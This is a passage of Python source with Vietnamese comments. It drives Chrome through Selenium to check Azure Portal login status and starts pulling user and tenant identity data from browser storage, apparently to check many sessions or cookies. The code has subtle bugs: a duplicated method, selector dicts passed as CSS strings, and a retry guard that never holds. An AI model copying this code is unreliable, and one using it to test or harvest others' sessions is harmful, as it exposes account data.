            'success_rate': success_count / len(self.task_success) if self.task_success else 0,
            'current_workers': self.current_workers,
            'system_metrics': self.system_metrics[-1] if self.system_metrics else None,
            'stability': stability,
            'processing_rate': processing_rate,
            'queue_length': len(self.task_queue),
            'worker_adjustments': len([m for m in self.system_metrics[1:] 
                                 if m.get('workers') != self.system_metrics[self.system_metrics.index(m)-1].get('workers')])
        }

    def shutdown(self):
        """Dừng scheduler và dọn dẹp tài nguyên"""
        self.shutdown_flag = True
        if hasattr(self, 'monitor_thread') and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=2)
        self.logger.info("AdaptiveTaskScheduler đã shutdown")

# --- Login/API Verification Components ---
class LoginVerifier:
    """
    Lớp chuyên trách xác thực đăng nhập và kiểm tra trạng thái người dùng.
    Cải tiến để khắc phục lỗi 'No Such Execution Context' và các vấn đề liên quan.
    """

    LOGGED_IN_URL_PATTERNS = ["portal.azure.com/#home", "portal.azure.com/#blade"]
    # Mở rộng patterns để đảm bảo bắt được nhiều trường hợp đăng nhập
    ADDITIONAL_LOGGED_IN_PATTERNS = ["portal.azure.com/#view", "portal.azure.com/dashboard"]
    
    # Page elements tiêu chuẩn của Azure Portal
    AZURE_PORTAL_SELECTORS = [
        {"type": By.TAG_NAME, "value": "h1", "name": "h1_element"},
        {"type": By.TAG_NAME, "value": "h2", "name": "h2_element"},
        {"type": By.CSS_SELECTOR, "value": "div.fxs-blade-content", "name": "blade_content"},
        {"type": By.CSS_SELECTOR, "value": "div.fxs-portal", "name": "portal_content"},
        {"type": By.CSS_SELECTOR, "value": "div.azc-grid", "name": "grid_content"},
        # Selector mới cho menu sidebar
        {"type": By.CSS_SELECTOR, "value": "nav.fxs-sidebar", "name": "sidebar_menu"},
        # Selector cho user menu dropdown
        {"type": By.CSS_SELECTOR, "value": "div.fxs-avatarmenu", "name": "user_menu"}
    ]
    
    def __init__(self, config: SimpleConfig, logger=None):
        self.config = config
        self.logger = logger or logging.getLogger(__name__)
        # Thêm các thuộc tính để tracking lỗi
        self.error_counts = {
            "execution_context": 0,
            "navigation": 0,
            "page_load_timeout": 0,
            "no_such_window": 0,
            "other_errors": 0
        }
        # Biến theo dõi lần kiểm tra cuối cùng
        self.last_verification_time = 0
        # Thêm thuộc tính để tracking successful patterns
        self.successful_patterns = {}
    
    def _check_execution_context(self, driver: webdriver.Chrome) -> bool:
        """
        Kiểm tra execution context của driver trước khi thực hiện các thao tác.
        
        Returns:
            bool: True nếu execution context còn tồn tại, False nếu đã mất.
        """
        if not driver:
            return False
            
        try:
            # Thực hiện script đơn giản để kiểm tra execution context
            result = driver.execute_script("return window.navigator.userAgent")
            if not result:
                self.logger.debug("Execution context không ổn định (userAgent trống)")
                return False
            return True
        except Exception as e:
            error_msg = str(e).lower()
            
            if "no such execution context" in error_msg:
                self.logger.warning(f"Phát hiện lỗi 'no such execution context'")
                self.error_counts["execution_context"] += 1
                return False
            elif "no such window" in error_msg:
                self.logger.warning(f"Phát hiện lỗi 'no such window'")
                self.error_counts["no_such_window"] += 1
                return False
            else:
                self.logger.debug(f"Lỗi khác khi kiểm tra execution context: {str(e)}")
                self.error_counts["other_errors"] += 1
                return False

    def _safe_execute_script(self, driver: webdriver.Chrome, script: str, default_value=None):
        """
        Thực thi JavaScript một cách an toàn, xử lý các lỗi execution context.
        
        Args:
            driver: WebDriver instance
            script: JavaScript cần thực thi
            default_value: Giá trị trả về mặc định nếu có lỗi
            
        Returns:
            Kết quả script hoặc default_value nếu có lỗi
        """
        try:
            return driver.execute_script(script)
        except Exception as e:
            error_msg = str(e).lower()
            if "no such execution context" in error_msg:
                self.error_counts["execution_context"] += 1
                self.logger.warning("Lỗi execution context khi thực thi script")
            elif "no such window" in error_msg:
                self.error_counts["no_such_window"] += 1
                self.logger.warning("Lỗi no such window khi thực thi script")
            else:
                self.logger.debug(f"Lỗi khi thực thi script: {str(e)}")
            return default_value

    @retry_with_backoff(max_retries=3, initial_delay=2, backoff_factor=2)
    def verify_login_status(self, driver: webdriver.Chrome) -> Tuple[bool, dict]:
        """
        Kiểm tra xem người dùng đã đăng nhập thành công hay chưa.
        Cải tiến để xử lý lỗi 'No Such Execution Context'.
        
        Returns:
            Tuple[bool, dict]: (đăng nhập thành công, chi tiết kiểm tra)
        """
        details = {
            "login_status": False,
            "login_method": None,
            "current_url": None,
            "error": None,
            "page_element_found": None,
            "execution_context_verified": False
        }
        error_url = "https://portal.azure.com/error/"
        extra_retry_done = False
        
        # Cập nhật thời gian kiểm tra
        self.last_verification_time = time.time()

        try:
            # STEP 1: Kiểm tra execution context ngay từ đầu
            if not self._check_execution_context(driver):
                self.logger.warning("Execution context không tồn tại trước khi bắt đầu kiểm tra đăng nhập")
                details["login_method"] = "execution_context_error"
                details["error"] = "Execution context không tồn tại"
                raise WebDriverException("No such execution context at start of verification")
            
            details["execution_context_verified"] = True
            
            # STEP 2: Kiểm tra driver còn kết nối không
            if not verify_driver_connection(driver):
                self.logger.warning("Driver không còn kết nối. Cần khởi tạo lại.")
                details["login_method"] = "driver_disconnected"
                details["error"] = "WebDriver không còn kết nối"
                return False, details
                
            # STEP 3: Đóng tất cả tab ngoại trừ tab hiện tại - với xử lý lỗi tốt hơn
            try:
                # Kiểm tra xem có window handles không 
                if not driver.window_handles or len(driver.window_handles) == 0:
                    self.logger.warning("Driver không có window handles")
                    details["login_method"] = "no_window_handles"
                    details["error"] = "WebDriver không có cửa sổ nào"
                    return False, details
                    
                # Nếu có nhiều tab, cố gắng đóng các tab dư thừa
                if len(driver.window_handles) > 1:
                    try:
                        close_all_tabs(driver)
                    except WebDriverException as e:
                        self.logger.warning(f"Không thể đóng tất cả tab: {str(e)}")
                        # Thử chuyển đến tab đầu tiên nếu không đóng được
                        try:
                            driver.switch_to.window(driver.window_handles[0])
                        except Exception as tab_e:
                            self.logger.warning(f"Không thể chuyển đến tab đầu tiên: {str(tab_e)}")
            except WebDriverException as e:
                error_msg = str(e).lower()
                if "no such window" in error_msg or "no such execution context" in error_msg:
                    self.logger.warning(f"Lỗi execution context khi kiểm tra tabs: {str(e)}")
                    details["login_method"] = "execution_context_error"
                    details["error"] = f"Lỗi execution context: {str(e)}"
                    raise WebDriverException(f"Window/context error: {str(e)}")
                else:
                    self.logger.warning(f"Lỗi WebDriver khi xử lý tabs: {str(e)}")
                    # Tiếp tục xử lý dù không đóng được tabs

            # STEP 4: Kiểm tra URL hiện tại trước khi điều hướng
            # Nếu đã ở Azure Portal và URL thỏa mãn pattern, có thể không cần chuyển hướng
            try:
                # Kiểm tra lại execution context trước khi lấy URL
                if not self._check_execution_context(driver):
                    self.logger.warning("Execution context không tồn tại trước khi lấy URL")
                    details["login_method"] = "execution_context_error"
                    details["error"] = "Execution context không tồn tại khi lấy URL"
                    raise WebDriverException("No such execution context when getting URL")
                
                current_url = driver.current_url.lower()
                details["current_url"] = current_url
                self.logger.debug(f"URL hiện tại trước khi điều hướng: {current_url}")
                
                # Nếu URL hiện tại đã khớp với pattern đăng nhập, không cần điều hướng
                already_logged_in = False
                for pattern in self.LOGGED_IN_URL_PATTERNS + self.ADDITIONAL_LOGGED_IN_PATTERNS:
                    if pattern in current_url:
                        already_logged_in = True
                        self.logger.info(f"Đã ở trang đăng nhập Azure Portal: {current_url}")
                        details["login_status"] = True
                        details["login_method"] = "url_pattern_already"
                        # Ghi nhận pattern thành công
                        if pattern not in self.successful_patterns:
                            self.successful_patterns[pattern] = 0
                        self.successful_patterns[pattern] += 1
                        
                        # Xác nhận thêm bằng cách kiểm tra DOM nếu đã đăng nhập
                        self._verify_portal_dom_elements(driver, details)
                        
                        return True, details
            except WebDriverException as e:
                error_msg = str(e).lower()
                if "no such window" in error_msg or "no such execution context" in error_msg:
                    self.logger.warning(f"Lỗi execution context khi kiểm tra URL hiện tại: {str(e)}")
                    details["login_method"] = "execution_context_error"
                    details["error"] = f"Lỗi execution context: {str(e)}"
                    raise WebDriverException(f"Window/context error: {str(e)}")
                else:
                    self.logger.warning(f"Lỗi WebDriver khi kiểm tra URL hiện tại: {str(e)}")
                    # Tiếp tục xử lý dù không lấy được URL

            # STEP 5: Truy cập URL kiểm tra với xử lý lỗi execution context
            check_url = self.config.login_check_url
            try:
                # Kiểm tra lại execution context và shutdown request trước khi điều hướng
                if is_shutdown_requested():
                    raise RuntimeError("Shutdown requested - dừng driver.get")
                
                if not self._check_execution_context(driver):
                    self.logger.warning("Execution context không tồn tại trước khi điều hướng")
                    details["login_method"] = "execution_context_error"
                    details["error"] = "Execution context không tồn tại trước driver.get"
                    raise WebDriverException("No such execution context before navigation")
                    
                self.logger.info(f"verify_login_status: Truy cập URL = {check_url}")
                
                # Đặt page load timeout trước khi điều hướng
                original_timeout = driver.timeouts.page_load
                page_load_timeout = self.config.get_timeout("login_check", 15)
                try:
                    driver.set_page_load_timeout(page_load_timeout)
                except Exception as e:
                    self.logger.warning(f"Không thể đặt page load timeout: {str(e)}")
                    
                # Thực hiện điều hướng với script thay vì driver.get() để tránh block
                # synchronous và cho phép kiểm tra lỗi execution context
                navigation_script = f"""
                try {{
                    window.location.href = "{check_url}";
                    return true;
                }} catch (e) {{
                    return "Error: " + e.message;
                }}
                """
                nav_result = self._safe_execute_script(driver, navigation_script)
                
                if isinstance(nav_result, str) and nav_result.startswith("Error"):
                    self.logger.warning(f"Lỗi khi điều hướng bằng script: {nav_result}")
                    # Thử phương pháp thông thường nếu script không hoạt động
                    driver.get(check_url)
                    
                # Khôi phục timeout ban đầu
                try:
                    driver.set_page_load_timeout(original_timeout)
                except Exception:
                    pass
                    
            except TimeoutException as e:
                self.logger.warning(f"Timeout khi điều hướng đến {check_url}: {str(e)}")
                self.error_counts["page_load_timeout"] += 1
                details["login_method"] = "navigation_timeout"
                details["error"] = f"Timeout khi điều hướng: {str(e)}"
                # Không return False ở đây, thử tiếp tục
                
            except WebDriverException as e:
                error_msg = str(e).lower()
                if "no such execution context" in error_msg:
                    self.logger.warning(f"Lỗi execution context khi điều hướng đến {check_url}: {str(e)}")
                    self.error_counts["execution_context"] += 1
                    details["login_method"] = "execution_context_error"
                    details["error"] = f"Lỗi execution context: {str(e)}"
                    raise WebDriverException(f"No such execution context: {str(e)}")
                elif "no such window" in error_msg:
                    self.logger.warning(f"Lỗi no such window khi điều hướng đến {check_url}: {str(e)}")
                    self.error_counts["no_such_window"] += 1
                    details["login_method"] = "no_such_window"
                    details["error"] = f"Lỗi no such window: {str(e)}"
                    raise WebDriverException(f"No such window: {str(e)}")
                else:
                    self.logger.warning(f"Lỗi khi điều hướng đến {check_url}: {str(e)}")
                    self.error_counts["navigation"] += 1
                    details["login_method"] = "navigation_error"
                    details["error"] = f"Lỗi điều hướng: {str(e)}"
                    return False, details
                
            self.logger.info("verify_login_status: Đang chờ trang load...")

            # STEP 6: Đợi trang tải với kiểm tra execution context trong quá trình
            try:
                # Thử đợi lần đầu (đợi ngắn hơn so với trước đây)
                page_load_timeout = self.config.get_timeout("login_check", 10)
                page_load_result = self._wait_for_page_elements(driver, page_load_timeout, error_url)
                
                if page_load_result == "execution_context_error":
                    self.logger.warning("Phát hiện lỗi execution context khi đợi trang tải")
                    details["login_method"] = "execution_context_error"
                    details["error"] = "Execution context bị mất khi đợi trang tải"
                    raise WebDriverException("No such execution context during page load wait")
                
                elif page_load_result == "error_url_detected":
                    # Phát hiện error_url trong _wait_for_page_elements
                    if not extra_retry_done:
                        self.logger.warning(f"Phát hiện URL lỗi {error_url}, thực hiện retry bổ sung")
                        extra_retry_done = True
                        time.sleep(2)
                        return self.verify_login_status(driver)
                    else:
                        self.logger.warning("Đã retry nhưng vẫn gặp error_url")
                        details["login_method"] = "error_url_persistent"
                        details["error"] = f"URL lỗi {error_url} vẫn xuất hiện sau khi retry"
                        return False, details
                
                elif page_load_result == "no_elements_found":
                    # Không tìm thấy phần tử h1, h2 - retry nếu chưa thử
                    if not extra_retry_done:
                        self.logger.warning("Không phát hiện phần tử trang, thực hiện retry bổ sung")
                        extra_retry_done = True
                        time.sleep(2)
                        return self.verify_login_status(driver)
                    else:
                        self.logger.warning("Đã retry nhưng vẫn không tìm thấy phần tử trang")
                        details["login_method"] = "elements_not_found"
                        details["error"] = "Không tìm thấy phần tử trang sau khi retry"
                        return False, details
                
                elif not page_load_result:
                    # Timeout khi đợi trang tải - không fail ngay, tiếp tục kiểm tra URL
                    self.logger.warning(f"Timeout {page_load_timeout}s khi chờ trang load")
                    details["login_method"] = "page_load_timeout"
                    details["error"] = "Timeout khi chờ trang tải"
                    # Không return ở đây, tiếp tục kiểm tra URL
                
            except WebDriverException as e:
                error_msg = str(e).lower()
                if "no such execution context" in error_msg:
                    self.logger.warning(f"Lỗi execution context khi đợi trang tải: {str(e)}")
                    self.error_counts["execution_context"] += 1
                    details["login_method"] = "execution_context_error"
                    details["error"] = f"Lỗi execution context: {str(e)}"
                    raise WebDriverException(f"No such execution context: {str(e)}")
                else:
                    self.logger.warning(f"Lỗi WebDriver khi đợi trang tải: {str(e)}")
                    details["login_method"] = "page_load_error"
                    details["error"] = f"Lỗi khi đợi trang tải: {str(e)}"
                    return False, details
                    
            # STEP 7: Kiểm tra URL một lần nữa để xác định đăng nhập
            try:
                # Kiểm tra lại execution context 
                if not self._check_execution_context(driver):
                    self.logger.warning("Execution context không tồn tại khi kiểm tra URL sau tải trang")
                    details["login_method"] = "execution_context_error"
                    details["error"] = "Execution context không tồn tại khi kiểm tra URL"
                    raise WebDriverException("No such execution context when checking URL")
                
                current_url = driver.current_url.lower()
                details["current_url"] = current_url
                self.logger.info(f"verify_login_status: current_url = {current_url}")
                
                # Kiểm tra error_url một lần nữa
                if error_url in current_url:
                    if not extra_retry_done:
                        self.logger.warning(f"Phát hiện URL lỗi {error_url}, thực hiện retry bổ sung")
                        extra_retry_done = True
                        time.sleep(2)
                        return self.verify_login_status(driver)
                    else:
                        self.logger.warning("Đã retry nhưng vẫn gặp error_url")
                        details["login_method"] = "error_url_persistent"
                        details["error"] = f"URL lỗi {error_url} vẫn xuất hiện sau khi retry"
                        return False, details
                        
                # Thêm các loại URL lỗi khác
                error_patterns = ["error.aspx", "login.microsoftonline.com/error", "portal.azure.com/error"]
                for error_pattern in error_patterns:
                    if error_pattern in current_url:
                        self.logger.warning(f"Phát hiện URL lỗi khác: {current_url}")
                        details["login_method"] = "other_error_url"
                        details["error"] = f"URL lỗi: {current_url}"
                        return False, details
                        
                # Kiểm tra xem URL có phải trang đăng nhập không
                login_patterns = ["login.microsoftonline.com", "login.live.com", "login.windows.net"]
                for login_pattern in login_patterns:
                    if login_pattern in current_url:
                        self.logger.info(f"Người dùng chưa đăng nhập, đang ở trang login: {current_url}")
                        details["login_method"] = "login_page"
                        details["error"] = "Người dùng chưa đăng nhập (cookie không hợp lệ)"
                        return False, details
                        
                # CHỈ kiểm tra URL hiện tại theo LOGGED_IN_URL_PATTERNS để xác định đăng nhập
                # Mở rộng pattern kiểm tra
                all_patterns = self.LOGGED_IN_URL_PATTERNS + self.ADDITIONAL_LOGGED_IN_PATTERNS
                for pattern in all_patterns:
                    if pattern in current_url:
                        details["login_status"] = True
                        details["login_method"] = "url_pattern"
                        self.logger.info(f"Kiểm tra đăng nhập thành công: URL chứa mẫu '{pattern}'")
                        
                        # Ghi nhận pattern thành công
                        if pattern not in self.successful_patterns:
                            self.successful_patterns[pattern] = 0
                        self.successful_patterns[pattern] += 1
                        
                        # Xác nhận thêm bằng cách kiểm tra DOM (không bắt buộc)
                        self._verify_portal_dom_elements(driver, details)
                        
                        return True, details
                        
                # Nếu không khớp với bất kỳ mẫu nào, kiểm tra thêm bằng DOM
                # Thử xác định dựa trên DOM nếu URL không khớp pattern
                dom_verified = self._verify_portal_dom_elements(driver, details)
                if dom_verified:
                    self.logger.info(f"Kiểm tra đăng nhập thành công qua DOM mặc dù URL không khớp pattern")
                    details["login_status"] = True
                    details["login_method"] = "dom_verified"
                    return True, details
                
                # Nếu vẫn không khớp, coi là chưa đăng nhập
                self.logger.info(f"Kiểm tra đăng nhập thất bại: URL không chứa mẫu đăng nhập")
                details["login_status"] = False
                details["login_method"] = "url_mismatch"
                return False, details
                    
            except WebDriverException as e:
                error_msg = str(e).lower()
                if "no such execution context" in error_msg:
                    self.logger.warning(f"Lỗi execution context khi kiểm tra URL cuối cùng: {str(e)}")
                    self.error_counts["execution_context"] += 1
                    details["login_method"] = "execution_context_error"
                    details["error"] = f"Lỗi execution context: {str(e)}"
                    raise WebDriverException(f"No such execution context: {str(e)}")
                else:
                    self.logger.warning(f"Lỗi khi kiểm tra URL: {str(e)}")
                    details["login_method"] = "url_check_error"
                    details["error"] = str(e)
                    return False, details
                
        except InvalidSessionIdException as e:
            self.logger.warning(f"Phiên WebDriver không hợp lệ: {str(e)}")
            details["login_method"] = "invalid_session"
            details["error"] = str(e)
            return False, details

        except WebDriverException as e:
            error_msg = str(e).lower()
            if "no such execution context" in error_msg:
                self.error_counts["execution_context"] += 1
                self.logger.warning(f"Lỗi execution context khi xác thực đăng nhập: {str(e)}")
                details["login_method"] = "execution_context_error"
                details["error"] = f"Lỗi execution context: {str(e)}"
            elif "no such window" in error_msg:
                self.error_counts["no_such_window"] += 1
                self.logger.warning(f"Lỗi no such window khi xác thực đăng nhập: {str(e)}")
                details["login_method"] = "no_such_window"
                details["error"] = f"Lỗi no such window: {str(e)}"
            else:
                self.logger.warning(f"Lỗi WebDriver khi xác thực đăng nhập: {str(e)}")
                details["login_method"] = "webdriver_error"
                details["error"] = str(e)
            
            # Ghi lại lỗi và trả về False
            self.error_counts["other_errors"] += 1
            return False, details

        except Exception as e:
            self.logger.error(f"Lỗi không mong đợi: {type(e).__name__}: {str(e)}")
            details["login_method"] = "unexpected_error"
            details["error"] = str(e)
            self.error_counts["other_errors"] += 1
            return False, details

    def _verify_portal_dom_elements(self, driver, details=None):
        """
        Kiểm tra các phần tử DOM đặc trưng của Azure Portal khi đã đăng nhập.
        
        Args:
            driver: WebDriver instance
            details: Dictionary để cập nhật chi tiết (optional)
            
        Returns:
            bool: True nếu xác định đã đăng nhập qua DOM
        """
        try:
            # Kiểm tra execution context
            if not self._check_execution_context(driver):
                return False
                
            # Danh sách selector quan trọng của Azure Portal khi đã đăng nhập
            portal_selectors = [
                {"type": By.CSS_SELECTOR, "value": "div.fxs-avatarmenu", "name": "user_avatar_menu"},
                {"type": By.CSS_SELECTOR, "value": "nav.fxs-sidebar", "name": "sidebar_nav"},
                {"type": By.CSS_SELECTOR, "value": "div.fxs-topbar", "name": "top_bar"}
            ]
            
            # Tìm kiếm các phần tử với timeout ngắn
            success_elements = []
            for selector in portal_selectors:
                try:
                    element = driver.find_element(selector["type"], selector["value"])
                    if element.is_displayed():
                        success_elements.append(selector["name"])
                except Exception:
                    continue
                    
            # Cập nhật chi tiết nếu có
            if details is not None:
                details["portal_elements_found"] = success_elements
                
            # Xác định đăng nhập nếu tìm thấy ít nhất 1 phần tử
            return len(success_elements) >= 1
            
        except Exception as e:
            self.logger.debug(f"Lỗi khi kiểm tra DOM Azure Portal: {str(e)}")
            return False

    def _wait_for_page_elements(self, driver, timeout=10, error_url=None):
        """
        Đợi các phần tử quan trọng xuất hiện trên trang.
        Cải tiến: Kiểm tra execution context trước và trong khi đợi.
        """
        try:
            # Kiểm tra execution context trước khi bắt đầu
            if not self._check_execution_context(driver):
                self.logger.warning("Mất execution context trước khi bắt đầu đợi phần tử")
                return False
            
            self.logger.info(f"_wait_for_page_elements: Đang đợi phần tử tiêu đề xuất hiện (timeout={timeout}s)")
            
            # Triển khai cơ chế đợi an toàn với kiểm tra context định kỳ
            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    # Kiểm tra execution context định kỳ
                    if not self._check_execution_context(driver):
                        self.logger.warning("Mất execution context trong quá trình đợi phần tử")
                        return False
                    
                    # Thử tìm một phần tử bất kỳ từ các selector
                    for selector in self.AZURE_PORTAL_SELECTORS:
                        try:
                            # Giảm timeout cho mỗi lần thử để không bị treo
                            WebDriverWait(driver, 2).until(
                                EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                            )
                            return True  # Tìm thấy phần tử, trả về thành công
                        except (TimeoutException, WebDriverException) as e:
                            # Lỗi nhỏ khi tìm phần tử, tiếp tục với selector khác
                            continue
                    
                    # Ngủ ngắn trước khi thử lại
                    time.sleep(0.5)
                except NoSuchExecutionContextException:
                    self.logger.warning("Phát hiện lỗi execution context khi đợi phần tử")
                    return False
                except WebDriverException as e:
                    if "No such execution context" in str(e):
                        self.logger.warning(f"Lỗi execution context khi đợi trang tải: {e}")
                        return False
                    raise
            
            # Hết thời gian timeout
            self.logger.warning("Hết thời gian đợi các phần tử trang xuất hiện")
            return False
        except NoSuchExecutionContextException as e:
            self.logger.warning(f"Phát hiện lỗi execution context khi đợi phần tử: {e}")
            return False
        except WebDriverException as e:
            if "No such execution context" in str(e):
                self.logger.warning(f"Lỗi execution context khi đợi trang tải: {e}")
                return False
            self.logger.error(f"Lỗi WebDriver khi đợi phần tử trang: {e}")
            return False

    def _safe_execute_script(self, driver, script, default_value=None):
        """
        Thực thi JavaScript an toàn với kiểm tra execution context.
        
        Args:
            driver: WebDriver instance
            script: JavaScript cần thực thi
            default_value: Giá trị mặc định nếu có lỗi
            
        Returns:
            Kết quả của script hoặc default_value nếu có lỗi
        """
        if not self._check_execution_context(driver):
            return default_value
            
        try:
            return driver.execute_script(script)
        except Exception as e:
            self.logger.debug(f"Lỗi khi thực thi script an toàn: {str(e)}")
            return default_value

    def _safe_wait_for_condition(self, driver, condition, timeout=10):
        """
        Đợi một điều kiện với kiểm tra execution context liên tục.
        
        Args:
            driver: WebDriver instance
            condition: Hàm điều kiện, nhận driver và trả về Boolean
            timeout: Thời gian tối đa chờ đợi (giây)
            
        Returns:
            bool: True nếu điều kiện thỏa mãn, False nếu timeout
        """
        start_time = time.time()
        check_interval = 0.5
        
        while time.time() - start_time < timeout:
            # Kiểm tra execution context trước khi kiểm tra điều kiện
            if not self._check_execution_context(driver):
                self.logger.debug("Mất execution context khi đợi điều kiện")
                return False
                
            try:
                if condition(driver):
                    return True
            except Exception as e:
                self.logger.debug(f"Lỗi khi kiểm tra điều kiện: {str(e)}")
                
            time.sleep(check_interval)
            
        return False

    def _wait_for_page_load_safely(self, driver, timeout=15):
        """
        Đợi trang load với kiểm tra execution context liên tục.
        
        Args:
            driver: WebDriver instance
            timeout: Thời gian tối đa chờ đợi (giây)
            
        Returns:
            bool: True nếu trang đã load, False nếu timeout hoặc lỗi
        """
        self.logger.debug(f"Đợi trang load, timeout={timeout}s")
        
        # Không sử dụng wait_for_page_load trực tiếp để tránh mất context
        try:
            # Đợi document readyState
            ready_state_condition = lambda d: d.execute_script("return document.readyState") in ["complete", "interactive"]
            
            if self._safe_wait_for_condition(driver, ready_state_condition, timeout):
                self.logger.debug("document.readyState báo trang đã load")
                
                # Kiểm tra thêm các phần tử quan trọng của trang
                try:
                    for selector in ["body", "header", "nav", "main", "div", "script", "html"]:
                        element_present = lambda d: len(d.find_elements(By.TAG_NAME, selector)) > 0
                        if self._safe_wait_for_condition(driver, element_present, 2):
                            self.logger.debug(f"Phát hiện phần tử {selector} trên trang")
                            return True
                except Exception:
                    # Nếu không tìm thấy phần tử nào cũng không sao
                    pass
                    
                # Trang đã load theo readyState
                return True
            
            self.logger.debug("Timeout khi đợi trang load")
            return False
            
        except Exception as e:
            self.logger.warning(f"Lỗi khi đợi trang load: {str(e)}")
            return False

    def _adaptive_sleep(self, duration, driver):
        """
        Sleep thích ứng với kiểm tra execution context định kỳ.
        
        Args:
            duration: Thời gian sleep (giây)
            driver: WebDriver instance để kiểm tra context
            
        Returns:
            bool: True nếu sleep đủ thời gian, False nếu bị ngắt do mất context
        """
        start_time = time.time()
        check_interval = 0.5  # Kiểm tra context mỗi 0.5 giây
        
        while time.time() - start_time < duration:
            # Ngắt sleep nếu phát hiện shutdown request
            if is_shutdown_requested():
                self.logger.debug("Phát hiện shutdown request trong adaptive_sleep")
                return False
                
            time.sleep(min(check_interval, duration - (time.time() - start_time)))
            
            # Kiểm tra execution context
            if not self._check_execution_context(driver):
                self.logger.debug("Mất execution context trong adaptive_sleep")
                return False
                
        return True

    def _determine_optimal_wait_time(self, driver, current_url):
        """
        Xác định thời gian chờ tối ưu dựa trên tình trạng trang.
        
        Args:
            driver: WebDriver instance
            current_url: URL hiện tại
            
        Returns:
            float: Thời gian chờ tối ưu (giây)
        """
        # Mặc định là 3 giây nếu đã ở Portal
        wait_time = 3.0
        
        try:
            # Nếu chưa ở Portal, cần thời gian dài hơn
            if "portal.azure.com" not in current_url.lower():
                wait_time = 4.0
                
            # Kiểm tra DOM và resource đã load chưa
            if self._check_execution_context(driver):
                dom_ready = self._safe_execute_script(driver, "return document.readyState === 'complete'", False)
                resources_loaded = self._safe_execute_script(
                    driver, 
                    "return window.performance && performance.timing && (performance.timing.loadEventEnd > 0)", 
                    False
                )
                
                # Điều chỉnh thời gian dựa trên trạng thái trang
                if dom_ready and resources_loaded:
                    # Trang đã load hoàn toàn - giảm thời gian chờ
                    wait_time *= 0.7
                elif not dom_ready:
                    # DOM chưa sẵn sàng - tăng thời gian chờ
                    wait_time *= 1.3
                    
                # Kiểm tra nếu localStorage và sessionStorage đã khởi tạo
                storage_ready = self._safe_execute_script(
                    driver,
                    "return window.localStorage && window.sessionStorage", 
                    False
                )
                
                if storage_ready:
                    # Storage đã sẵn sàng - giảm thời gian chờ
                    wait_time *= 0.8
                    
            # Giới hạn thời gian chờ trong khoảng hợp lý
            wait_time = min(max(1.0, wait_time), 5.0)
            
        except Exception as e:
            self.logger.debug(f"Lỗi khi xác định thời gian chờ: {str(e)}")
            
        return wait_time

    def _evaluate_verification_result(self, details):
        """
        Đánh giá kết quả xác thực và cung cấp thông tin hữu ích cho triển khai.
        
        Args:
            details: Dictionary chứa chi tiết kết quả
        """
        # Thêm các thông tin hữu ích cho debugging và cải thiện hệ thống
        try:
            elapsed_ms = details.get("total_execution_time_ms", 0)
            
            if details.get("api_check_status", False):
                # Đánh giá kết quả thành công
                details["evaluation"] = {
                    "result_quality": "good" if details.get("user_id") and details.get("display_name") else "partial",
                    "time_assessment": "fast" if elapsed_ms < 5000 else "normal" if elapsed_ms < 10000 else "slow",
                    "recommendations": []
                }
                
                # Ghi nhận nếu có data_source để cải thiện hệ thống
                if details.get("data_source"):
                    details["evaluation"]["successful_data_source"] = details.get("data_source")
                    
            else:
                # Đánh giá kết quả thất bại
                details["evaluation"] = {
                    "failure_cause": self._determine_failure_cause(details),
                    "time_assessment": "fast" if elapsed_ms < 3000 else "normal" if elapsed_ms < 7000 else "slow",
                    "recommendations": ["retry_with_different_profile" if "execution_context" in details.get("api_error", "") else "try_login_check_first"]
                }
                
        except Exception as e:
            self.logger.debug(f"Lỗi khi đánh giá kết quả: {str(e)}")

    def _determine_failure_cause(self, details):
        """
        Xác định nguyên nhân chính khiến xác thực thất bại.
        
        Args:
            details: Dictionary chứa chi tiết kết quả
            
        Returns:
            str: Mô tả nguyên nhân thất bại chính
        """
        error_msg = details.get("api_error", "").lower()
        
        if "execution_context" in error_msg:
            return "execution_context_lost"
        elif "window" in error_msg:
            return "window_closed"
        elif "không tìm thấy thông tin người dùng" in error_msg or "không có dữ liệu" in error_msg:
            return "no_user_data_found"
        elif "không thể truy cập storage" in error_msg:
            return "storage_access_failed"
        elif "navigation" in error_msg or "điều hướng" in error_msg:
            return "navigation_failed"
        elif "timeout" in error_msg:
            return "timeout"
        else:
            return "unknown"

    def _get_data_from_storage(self, driver: webdriver.Chrome) -> Tuple[bool, Dict]:
        """
        Lấy dữ liệu người dùng từ localStorage và sessionStorage.
        Phiên bản tối ưu tập trung vào nhiều pattern lưu trữ khác nhau của Azure AD.
        
        Returns:
            Tuple[bool, Dict]: (verification_success, details)
        """
        details = {
            "api_check_status": False,
            "user_id": None,
            "display_name": None,
            "domain_name": None,
            "data_source": None,
            "is_valid_account": False,
            "api_error": None,
            "debug_info": {}
        }
        
        start_time = time.time()
        self.logger.debug("Bắt đầu trích xuất dữ liệu từ storage")
        
        try:
            # Tăng script timeout để tránh lỗi timeout
            driver.set_script_timeout(15)  # Tăng từ 10s lên 15s
            
            # Kiểm tra truy cập storage
            try:
                storage_access_script = """
                return {
                    hasLocalStorage: typeof localStorage !== 'undefined',
                    hasSessionStorage: typeof sessionStorage !== 'undefined',
                    localStorage: typeof localStorage !== 'undefined' ? Object.keys(localStorage).length : 0,
                    sessionStorage: typeof sessionStorage !== 'undefined' ? Object.keys(sessionStorage).length : 0,
                    url: window.location.href
                }
                """
                storage_access = driver.execute_script(storage_access_script)
                
                details["debug_info"]["storage_access"] = storage_access
                
                if not storage_access.get('hasLocalStorage') or not storage_access.get('hasSessionStorage'):
                    details["api_error"] = "Không thể truy cập storage (localStorage hoặc sessionStorage không khả dụng)"
                    self.logger.warning(f"Storage không khả dụng: {storage_access}")
                    return False, details
                    
                # Ghi log thông tin storage
                self.logger.debug(
                    f"Storage truy cập OK: localStorage ({storage_access.get('localStorage', 0)} key), "
                    f"sessionStorage ({storage_access.get('sessionStorage', 0)} key)"
                )
                
            except Exception as storage_error:
                details["api_error"] = f"Lỗi kiểm tra khả năng truy cập storage: {str(storage_error)}"
                self.logger.warning(f"Lỗi kiểm tra storage: {str(storage_error)}")
                return False, details
            
            # SCRIPT CẢI TIẾN: Thêm nhiều cách trích xuất dữ liệu hơn và debug chi tiết
            optimized_script = r"""
            function extractCriticalAzureData() {
                // Kết quả
                const result = {
                    user: {
                        userId: null,
                        displayName: null,
                        email: null,
                        upn: null,
                        alternativeIds: []
                    },
                    tenant: {
                        id: null,
                        domain: null,
                        alternativeDomains: []
                    },
                    isValid: false,
                    dataSources: [],
                    idp: null,
